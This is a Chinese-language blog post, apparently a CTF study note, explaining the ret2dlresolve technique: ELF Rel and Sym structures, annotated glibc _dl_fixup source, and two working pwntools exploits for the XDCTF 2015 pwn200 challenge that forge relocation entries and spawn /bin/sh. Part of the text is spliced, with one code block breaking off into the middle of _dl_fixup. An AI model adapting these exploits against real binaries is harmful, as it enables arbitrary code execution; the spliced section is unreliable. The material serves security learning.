@@ -1,0 +1,571 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>ret2dlresolve 利用技术 | 良夜の小窝</title>
+    <meta name="author" content="良夜" />
+    <meta name="description" content="Here's an cat..." />
+    <meta name="keywords" content="良夜,博客,ice993" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/lty.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+<script src="/js/lib/click-effect.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>良夜の小窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;良夜の小窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>ret2dlresolve 利用技术</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/6/20
+        </span>
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/pwn/" style="color: #ff7d73">
+                    pwn
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/ret2dlresolve/" style="color: #03a9f4">
+                    ret2dlresolve
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>当不能泄露libc时。我们可以通过retdlresolve这种方法来伪造动态链接器。控制程序的执行流程。</p>
+<p>主要是延迟绑定中的re_dlresolve函数</p>
+<p>在 <strong>Ret2dlresolve</strong> 攻击中，你的目的是让链接器帮你解析一个<strong>原本不存在于导入表中的函数</strong>（比如 <code>system</code>），或者你想劫持解析过程。因为 <code>.rel.plt</code> 没法写，所以你必须：</p>
+<ol>
+<li>在可写的区域（如 BSS 段）<strong>伪造</strong>一个重定位表项（即 <code>fake_reloc</code>）。</li>
+<li>告诉链接器去这里读数据，而不是去正常的 <code>.rel.plt</code> 读。</li>
+<li>我们需要构造出完整的流程</li>
+</ol>
+<blockquote>
+<p>延迟绑定：当程序第一次调用一个动态链接的函数时，会通过 PLT (Procedure Linkage Table) 和 GOT (Global Offset Table) 来完成函数地址的解析。这个过程涉及到 _dl_runtime_resolve 函数的调用。</p>
+</blockquote>
+<ol>
+<li><strong>_dl_fixup 函数</strong>：_<em>dl_runtime_resolve</em> 实际上调用了 _<em>dl_fixup</em> 函数，该函数在 glibc 中实现，用于解析符号并更新 GOT 表。</li>
+<li><strong>RELRO 类型</strong>：根据程序的 RELRO (Relocation Read-Only) 类型，攻击者需要采取不同的策略。NO RELRO 时，<em>.dynamic</em> 节是可写的，可以直接修改；Partial RELRO 时，<em>.dynamic</em> 节是只读的，但 <em>.rel.plt</em> 节是可写的，需要通过栈迁移等技术来伪造数据结构。</li>
+<li><strong>攻击实践</strong>：攻击者需要伪造 <em>.rel.plt</em>、<em>.dynsym</em> 和 <em>.dynstr</em> 节中的数据结构，然后通过控制 <em>reloc_arg</em> 和 <em>link_map</em> 来调用 _<em>dl_runtime_resolve</em> 函数，最终实现调用 <em>system(“&#x2F;bin&#x2F;sh”)</em> 来获取 shell。</li>
+</ol>
+<p><strong>.rel.plt</strong>节是用于函数重定位，<strong>.rel.dyn</strong>是用于变量重定位</p>
+<h2 id="dl-fixup函数"><a href="#dl-fixup函数" class="headerlink" title="_dl_fixup函数"></a>_dl_fixup函数</h2><p>传入的两个参数。一个是rdi寄存器中存储的link_map，rsi是GOT表中关于PLT重定位的索引值，后面要根据该索引值写入新的地址。</p>
+<p>就是用于解析导入函数的真实地址，并改写GOT</p>
+<p>“<strong>当程序导入函数时，动态链接器在</strong><code>**.dynstr**</code><strong>段中添加一个函数名称字符串</strong><br><strong>在</strong><code>**.dynsym**</code><strong>段中添加一个指向函数名称字符串的</strong><code>**Elf Sym**</code><strong>结构体</strong><br><strong>在</strong><code>**.rel.plt**</code><strong>段中添加一个指向</strong><code>**Elf Sym**</code><strong>的</strong><code>**Elf Rel**</code><strong>结构体</strong><br><strong>最后</strong><code>**Elf Rel**</code><strong>的</strong><code>**r_offse**</code><strong>构成GOT表，保存在</strong><code>**.got.plt**</code><strong>段中</strong>“</p>
+<h2 id="重定位rel表"><a href="#重定位rel表" class="headerlink" title="重定位rel表"></a>重定位rel表</h2><p> 动态链接器的“待办事项清单”，它告诉链接器：“请算出某某函数的真实地址，然后填到某某地方去”。  </p>
+<ol>
+<li><code>**r_info**</code> 是一个<strong>压缩数据</strong>。在 32 位 ELF 中，为了节省空间，它把“找哪个符号”和“怎么处理”这两个信息，压到了同一个 32 位整数里。所以它有两部分<ul>
+<li><strong>高 24 位</strong>：存放符号表索引 (<code>r_sym</code>)。</li>
+<li><strong>低 8 位</strong>：存放重定位类型 (<code>r_type</code>)。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="1-什么是-Rel-表-rel-plt-？"><a href="#1-什么是-Rel-表-rel-plt-？" class="headerlink" title="1. 什么是 Rel 表 (.rel.plt)？"></a>1. 什么是 Rel 表 (<code>.rel.plt</code>)？</h3><p>在程序编译时，编译器不知道 <code>system</code>、<code>read</code> 这些动态库函数的真实地址（因为它们在 libc.so 里，且地址随机）。</p>
+<p>所以，编译器在程序里留了一张表，叫做 <strong>重定位表 (</strong><code>**Elf32_Rel**</code><strong>)</strong>。这就好比是一张<strong>填空题试卷</strong>：</p>
+<ul>
+<li><strong>题目 1</strong>：请计算 <code>read</code> 函数的真实地址，填入 <code>0x804a010</code> (read_got)。</li>
+<li><strong>题目 2</strong>：请计算 <code>write</code> 函数的真实地址，填入 <code>0x804a014</code> (write_got)。</li>
+</ul>
+<p>动态链接器 (<code>_dl_runtime_resolve</code>) 运行时的核心工作就是：<strong>读取这张表，做完题目，填好空。</strong></p>
+<p>这张表里的每一项（每一道题）结构如下：</p>
+<pre><code class="language-c">typedef struct &#123;
+    Elf32_Addr r_offset;  // 填空的位置 (比如 write_got 的地址)
+    Elf32_Word r_info;    // 题目信息 (包含：找谁？怎么填？)
+&#125; Elf32_Rel;
+</code></pre>
+<hr>
+<h3 id="2-r-info-的位操作"><a href="#2-r-info-的位操作" class="headerlink" title="2. r_info 的位操作"></a>2. <code>r_info</code> 的位操作</h3><p>r_info 是一个 Elf32_Word (32位无符号整数，4字节)。它的高24位和低八位又再分</p>
+<p>分别为r_sym和r_type</p>
+<p>它虽然只是一个整数，但 ELF 规范 (Specification) 规定了它的比特位分布：</p>
+<table>
+<thead>
+<tr>
+<th><strong>Bit 31 …………………… Bit 8</strong></th>
+<th><strong>Bit 7 ………. Bit 0</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>ELF32_R_SYM (符号索引)</strong></td>
+<td><strong>ELF32_R_TYPE (类型)</strong></td>
+</tr>
+<tr>
+<td><strong>高 24 位</strong></td>
+<td><strong>低 8 位</strong></td>
+</tr>
+</tbody></table>
+<h4 id="为什么要这么分？"><a href="#为什么要这么分？" class="headerlink" title="为什么要这么分？"></a>为什么要这么分？</h4><ul>
+<li><code>**r_type**</code>：重定位类型（比如 <code>R_386_JUMP_SLOT</code> 固定是 <code>0x7</code>）。它只需要很少的几种类型，<strong>8 个比特</strong> (0-255) 足够了。</li>
+<li><code>**r_sym**</code>：符号表索引。一个程序可能会导入成千上万个函数，所以需要更大的空间，<strong>24 个比特</strong> (可以支持 1600万个符号) 留给它。</li>
+</ul>
+<p>然后我们如果要伪造对应的rel表。对应这一块要把r_sym、r_type、r_offset设置成要换的函数</p>
+<p>r_info通过拼接得到。</p>
+<p>然后有了rel表以后我们介绍ELF符号表</p>
+<h2 id="ELF表和sym结构体"><a href="#ELF表和sym结构体" class="headerlink" title="ELF表和sym结构体"></a>ELF表和sym结构体</h2><p>ELF符号表好像有很多东西。不过32位的时候我们只需要伪造里面的sym结构体（ELF32_sym）就行</p>
+<p>简单来说，<code>**Sym**</code>** 表就是函数的“身份证”**。 链接器拿到 <code>Rel</code> 表（工单）后，会根据索引找到这张 <code>Sym</code> 表（身份证），通过身份证上的信息确认：“哦，原来你要找的函数叫 <code>system</code>，它是个全局函数。”</p>
+<hr>
+<h3 id="1-Elf32-Sym-结构体标准定义-16字节"><a href="#1-Elf32-Sym-结构体标准定义-16字节" class="headerlink" title="1. Elf32_Sym 结构体标准定义 (16字节)"></a>1. <code>Elf32_Sym</code> 结构体标准定义 (16字节)</h3><p>在 C 语言中，它的定义是这样的：</p>
+<pre><code class="language-c">typedef struct &#123;
+    Elf32_Word    st_name;  // 4字节: 名字在哪里？(字符串表的偏移)
+    Elf32_Addr    st_value; // 4字节: 函数地址 (导入函数填0)
+    Elf32_Word    st_size;  // 4字节: 函数大小 (导入函数填0)
+    unsigned char st_info;  // 1字节: 属性 (类型+绑定)
+    unsigned char st_other; // 1字节: 可见性 (0)
+    Elf32_Half    st_shndx; // 2字节: 归属段 (0)
+&#125; Elf32_Sym;
+</code></pre>
+<h3 id="下面介绍st-name-的具体工作原理"><a href="#下面介绍st-name-的具体工作原理" class="headerlink" title="下面介绍st_name 的具体工作原理"></a>下面介绍<code>st_name</code> 的具体工作原理</h3><p>   可以了解一下偶然看到的</p>
+<p>   ELF 文件为了节省空间，不会把函数名（如 <code>&quot;system&quot;</code>, <code>&quot;printf&quot;</code>, <code>&quot;write&quot;</code>）直接写在 Symbol 结构体里。相反，它把所有字符串连在一起，放在一个叫 <code>**.dynstr**</code>** (Dynamic String Table)** 的区域里。</p>
+<p><code>**st_name**</code>** 存的就是相对于 <strong><code>**.dynstr**</code></strong> 起始地址的偏移量。**</p>
+<hr>
+<p><strong>ok那么我们伪造了一个</strong> sym结构体的话，如果你想让它里面代表 <code>**write**</code> 函数：</p>
+<p>对于st_name就应该</p>
+<ol>
+<li><strong>你需要算出 <strong><code>**&quot;write&quot;**</code></strong> 字符串相对于 <strong><code>**.dynstr**</code></strong> 开头的距离。</strong></li>
+<li><strong>距离 &#x3D; <strong><code>**0x08048206**</code></strong> - <strong><code>**0x08048200**</code></strong> &#x3D; <strong><code>**6**</code></strong>。</strong></li>
+<li><strong>所以，你的 <strong><code>**fake_sym.st_name**</code></strong> 必须填入 <strong><code>**6**</code></strong>。</strong></li>
+</ol>
+<p><strong>链接器看到 <strong><code>**st_name = 6**</code></strong>，就会做如下计算：</strong></p>
+<p>**函数名地址 &#x3D; **<code>**.dynstr**</code><strong>基地址 + <strong><code>**6**</code></strong> &#x3D; 指向 “write”</strong></p>
+<h3 id="st-value-st-size（值与大小）"><a href="#st-value-st-size（值与大小）" class="headerlink" title="st_value  st_size（值与大小）"></a>st_value  st_size（值与大小）</h3><h4 id="st-value"><a href="#st-value" class="headerlink" title="st_value"></a>st_value</h4><ul>
+<li><strong>类型</strong>：<code>Elf32_Addr</code> (地址)</li>
+</ul>
+<p><strong>标准含义</strong>：</p>
+<ul>
+<li><strong>如果是已定义的函数</strong>：这里存的是函数在内存中的<strong>虚拟地址</strong>（或者在文件中的偏移）。</li>
+<li><strong>如果是未定义的函数（导入函数）</strong>：这里通常为 <strong>0</strong>。</li>
+</ul>
+<p><strong>在攻击中的设置</strong>：<code>**0**</code></p>
+<ul>
+<li><strong>原因</strong>：我们伪造这个符号是为了让链接器去 libc 里找 <code>system</code>，而不是我们在程序里自己写了一个 <code>system</code>。既然是“去外面找”，那我们手头就没有它的地址，留空（0）即可。链接器解析完成后，会把找到的真地址填到 GOT 表里，而不是改写这里。</li>
+</ul>
+<h4 id="st-size"><a href="#st-size" class="headerlink" title="st_size"></a>st_size</h4><ul>
+<li><strong>类型</strong>：<code>Elf32_Word</code> (整数)</li>
+</ul>
+<p>**  标准含义**：</p>
+<ul>
+<li>该符号占用多少字节的内存。比如一个函数有 100 行汇编，可能大小就是 200 字节。</li>
+<li><strong>在攻击中的设置</strong>：<code>**0**</code></li>
+<li><strong>原因</strong>：动态链接器在解析函数地址时，只关心“函数在哪里（起始地址）”，根本不关心“函数有多长”。填 0 是最省事且安全的做法。</li>
+</ul>
+<pre><code class="language-python">p32(0) + p32(0)
+</code></pre>
+<h2 id="st-info"><a href="#st-info" class="headerlink" title="st_info"></a>st_info</h2><p>与我们的重定位表类似。这里它也有两部分</p>
+<pre><code class="language-c">st_bind = 0x1
+st_type = 0x2
+st_info = (st_bind r_info)];
+
+    void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);
+    lookup_t result;
+    DL_FIXUP_VALUE_TYPE value;
+
+    // 检查r_info的最低位是不是7
+    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); 
+
+    // 这里是一层检测，检查sym结构体中的st_other是否为0，正常情况下为0，执行下面代码
+    if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) 
+    &#123;
+        const struct r_found_version *version = NULL;
+
+        // 这里也是一层检测，检查link_map中的DT_VERSYM是否为NULL，正常情况下不为NULL，执行下面代码
+        if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)
+        &#123;
+            /* 到了这里就是64位下报错的位置，在计算版本号时，vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff的过程中，
+			由于我们一般伪造的symtab位于bss段，就导致在64位下reloc-&gt;r_info比较大,故程序会发生错误。所以要使程序不发生错误，
+			自然想到的办法就是不执行这里的代码，分析上面的代码我们就可以得到两种手段：
+
+			第一种手段就是使上一行的if不成立，也就是设置link_map中的DT_VERSYM为NULL，那我们就要泄露出link_map的地址，而如果我们能泄露地址，根本用不着ret2dlresolve。
+			第二种手段就是使最外层的if不成立，也就是使sym结构体中的st_other不为0，直接跳到后面的else语句执行。*/
+            const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
+            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;
+            version = &amp;l-&gt;l_versions[ndx];
+            if (version-&gt;hash == 0)
+                version = NULL;
+        &#125;
+
+        int flags = DL_LOOKUP_ADD_DEPENDENCY;
+        if (!RTLD_SINGLE_THREAD_P)
+        &#123;
+            THREAD_GSCOPE_SET_FLAG ();
+            flags |= DL_LOOKUP_GSCOPE_LOCK;
+        &#125;
+
+        RTLD_ENABLE_FOREIGN_CALL;
+
+        // 在32位情况下，上面代码运行中不会出错，就会走到这里，这里通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址
+        result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,
+                                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);
+
+        if (!RTLD_SINGLE_THREAD_P)
+            THREAD_GSCOPE_RESET_FLAG ();
+
+        RTLD_FINALIZE_FOREIGN_CALL;
+
+        // 同样，如果正常执行，接下来会来到这里，得到value的值，为libc基址加上要解析函数的偏移地址，也即实际地址，即result+st_value
+        value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0);
+    &#125;
+    else
+    &#123;
+        // 这里就是64位下利用的关键，在最上面的if不成立后，就会来到这里,这里value的计算方式是 l-&gt;l_addr + st_value,我们的目的是使**value为我们所需要的函数的地址，所以就得控制两个参数，l_addr 和 st_value
+        /* We already found the symbol.  The module (and therefore its load
+     address) is also known.  */
+        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);
+        result = l;
+    &#125;
+
+    /* And now perhaps the relocation addend.  */
+    value = elf_machine_plt_value (l, reloc, value);
+
+    if (sym != NULL
+      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))
+        value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));
+
+    /* Finally, fix up the plt itself.  */
+    if (__glibc_unlikely (GLRO(dl_bind_not)))
+    return value;
+  // 最后把value写入相应的GOT表条目中
+  return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
+&#125;
+</code></pre>
+<h1 id="XDCTF-2015-pwn200（32位）"><a href="#XDCTF-2015-pwn200（32位）" class="headerlink" title="XDCTF 2015 pwn200（32位）"></a>XDCTF 2015 pwn200（32位）</h1><p>这道题用了偷梁换柱的方法。原来要解析write函数。我们换成system</p>
+<pre><code class="language-python">from pwn import *
+
+# context.log_level = &#39;debug&#39;
+
+elf = ELF(&#39;./pwn200&#39;)
+# io = remote(&#39;127.0.0.1&#39;, 10001)
+io = process(&#39;./pwn200&#39;)
+io.recv()
+
+pppr_addr      = 0x08048619     # pop esi ; pop edi ; pop ebp ; ret
+pop_ebp_addr   = 0x0804861b     # pop ebp ; ret
+leave_ret_addr = 0x08048458 #: leave ; ret
+
+write_plt = elf.plt[&#39;write&#39;]
+write_got = elf.got[&#39;write&#39;]
+read_plt  = elf.plt[&#39;read&#39;]
+
+plt_0    = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addr        # 0x80483e0
+rel_plt  = elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addr    # 0x8048390
+dynsym   = elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addr     # 0x80481cc
+dynstr   = elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr     # 0x804828c
+bss_addr = elf.get_section_by_name(&#39;.bss&#39;).header.sh_addr        # 0x804a028
+
+base_addr = bss_addr + 0x600   
+
+payload_1  = b&quot;A&quot; * 112
+payload_1 += p32(read_plt)
+payload_1 += p32(pppr_addr)
+payload_1 += p32(0)
+payload_1 += p32(base_addr)
+payload_1 += p32(100)
+payload_1 += p32(pop_ebp_addr)
+payload_1 += p32(base_addr)
+payload_1 += p32(leave_ret_addr)
+io.send(payload_1)
+&#39;&#39;&#39;
+上面是在打开一些需要用的地址。然后分配好在bss上迁移的空间。利用程序里的溢出把控制流弄到bss
+进行栈迁移。在bss上伪造我们的表
+&#39;&#39;&#39;
+
+reloc_index = base_addr + 28 - rel_plt      
+#我们这里计算地址的时候也是用的基准+偏移的方式。＋0x28在下面的payload里
+
+fake_sym_addr = base_addr + 36
+
+align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)
+fake_sym_addr = fake_sym_addr + align       # 对齐
+
+# fake Elf Rel
+r_sym = (fake_sym_addr - dynsym) / 0x10
+r_type = 0x7
+r_info = (int(r_sym) &lt;&lt; 8) + (r_type &amp; 0xff)
+fake_reloc = p32(write_got) + p32(r_info)
+
+# fake Elf Sym
+st_name = fake_sym_addr + 0x10 - dynstr
+st_bind = 0x1
+st_type = 0x2
+st_info = (st_bind &lt;&lt; 4) + (st_type &amp; 0xf)
+fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)
+
+payload_7 = b&quot;AAAA&quot;                  #0x4
+payload_7 += p32(plt_0)              #0x8
+payload_7 += p32(reloc_index)        #0x12
+payload_7 += b&quot;AAAA&quot;                 #0x16
+payload_7 += p32(base_addr + 80)     #0x20
+payload_7 += b&quot;AAAA&quot;                 #0x24
+payload_7 += b&quot;AAAA&quot;                 #0x28
+payload_7 += fake_reloc
+payload_7 += b&quot;A&quot; * align
+payload_7 += fake_sym
+payload_7 += b&quot;system\x00&quot;
+payload_7 += b&quot;A&quot; * (80 - len(payload_7))
+payload_7 += b&quot;/bin/sh\x00&quot;
+payload_7 += b&quot;A&quot; * (100 - len(payload_7))
+io.sendline(payload_7)
+io.interactive()
+</code></pre>
+<p>自动化构造：</p>
+<pre><code class="language-python">from pwn import *
+
+context.binary = elf = ELF(&quot;./pwn200&quot;)
+context.arch=&#39;i386&#39;
+context.log_level =&#39;debug&#39;
+
+rop = ROP(context.binary)
+
+dlresolve = Ret2dlresolvePayload(elf,symbol=&quot;system&quot;,args=[&quot;/bin/sh&quot;])
+rop.read(0,dlresolve.data_addr)
+rop.ret2dlresolve(dlresolve)
+raw_rop = rop.chain()
+io = process(&quot;./pwn200&quot;)
+io.recvuntil(&quot;\n&quot;)
+payload = flat(&#123;112:raw_rop,256:dlresolve.payload&#125;)
+io.sendline(payload)
+io.interactive()
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2026 良夜の小窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;良夜
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+<script
+    src="https://giscus.app/client.js"
+    data-repo="ice993/hexo-123"
+    data-repo-id="R_kgDOPWL0Lg"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOPWL0Ls4Ct1k-"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
+    
+    <script>
+    if ("serviceWorker" in navigator) {
+        navigator.serviceWorker.register("/sw.js");
+    }
+    </script>
+</body>
+</html>
